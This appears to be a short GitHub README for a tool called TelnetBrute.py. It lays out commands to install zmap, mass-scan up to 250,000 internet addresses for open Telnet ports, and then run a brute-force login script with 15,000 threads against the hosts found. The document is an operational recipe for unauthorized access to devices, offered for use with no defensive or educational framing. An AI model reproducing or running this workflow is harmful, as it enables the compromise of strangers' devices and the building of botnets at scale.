[VPS CentOS 6.9/6.8] (Recomendado)

- Install zmap

1- sh CentOS_zmap_auto_install.sh OR Debian_zmap_auto_install.sh

- Scan Telnet Ips

1- ulimit -n 999999

2- zmap -p23 -o mfutelnet.txt -N 250000   

   1,5-(optional)  zmap -p23 -o mfutelnet.txt -w telnet.lst  

- Bruteforce 

2- ulimit -n 999999

3- python TelnetBrute.py mfutelnet.txt 15000 telnettest.txt    




<img src="https://raw.githubusercontent.com/XeljomudoX/TelnetBrute.py/master/lul.png">



Video: https://www.youtube.com/embed/ZOCRpKSFLfs
